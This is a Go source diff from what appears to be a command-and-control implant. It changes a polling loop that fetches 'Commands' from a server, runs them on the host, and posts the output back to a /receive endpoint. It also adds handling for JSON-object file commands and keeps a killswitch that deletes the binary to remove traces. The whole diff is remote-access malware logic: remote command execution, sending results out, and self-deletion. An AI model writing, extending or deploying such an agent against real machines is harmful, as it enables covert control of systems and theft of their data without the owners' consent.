@@ -195,8 +195,8 @@ func ExecuteCommand(command string) (string, error) {
 	if out, err, handled := runBuiltinHTTPCommand(command); handled {
 		return out, err
 	}
-	// Split the command into name and args
-	parts := strings.Fields(command)
+	norm := normalizeBuiltinCommand(command)
+	parts := strings.Fields(norm)
 	if len(parts) == 0 {
 		return "", errors.New("empty command received")
 	}
@@ -327,18 +327,26 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 
 		if commands, found := jsonResponse["Commands"].([]interface{}); found {
 			for _, cmd := range commands {
-				commandStr, ok := cmd.(string)
-				if !ok {
-					log.Println("[-] Invalid command format, skipping...")
+				var commandKey string
+				var output string
+				var err error
+
+				switch v := cmd.(type) {
+				case string:
+					commandKey = v
+					if strings.TrimSpace(commandKey) == httpKillswitchCommand {
+						log.Println("[-] Killswitch received; stopping and removing binary.")
+						selfDelete()
+					}
+					output, err = ExecuteCommand(commandKey)
+				case map[string]interface{}:
+					commandKey = commandMapToString(v)
+					output, err = handleHTTPFileCommandMap(v)
+				default:
+					log.Println("[-] Invalid command format (expected string or JSON object), skipping...")
 					continue
 				}
 
-				if strings.TrimSpace(commandStr) == httpKillswitchCommand {
-					log.Println("[-] Killswitch received; stopping and removing binary.")
-					selfDelete()
-				}
-
-				output, err := ExecuteCommand(commandStr)
 				if err != nil {
 					log.Printf("[-] Command execution failed: %s\n", err)
 					output = err.Error()
@@ -350,8 +358,7 @@ func MakeRequest(opts *RequestOptions) (*ResponseData, error) {
 					postURL += "/" + uuid
 				}
 
-				// Send output back to /receive
-				err = SendCommandOutput(postURL, commandStr, output, opts.Headers, opts)
+				err = SendCommandOutput(postURL, commandKey, output, opts.Headers, opts)
 				if err != nil {
 					log.Printf("[-] Failed to send command output: %s\n", err)
 				}
